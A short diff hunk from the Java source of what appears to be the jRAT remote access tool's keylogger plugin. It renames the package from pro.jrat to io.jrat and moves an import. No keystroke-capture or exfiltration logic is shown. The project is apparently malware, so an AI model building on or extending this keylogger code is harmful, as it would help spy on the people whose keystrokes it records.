@@ -1,9 +1,10 @@
-package pro.jrat.plugin.keylogger.stub.activities;
+package io.jrat.plugin.keylogger.stub.activities;
+
+import io.jrat.plugin.keylogger.stub.StubPlugin;
 
 import java.util.ArrayList;
 import java.util.List;
 
-import pro.jrat.plugin.keylogger.stub.StubPlugin;
 
 public class Activities {
 
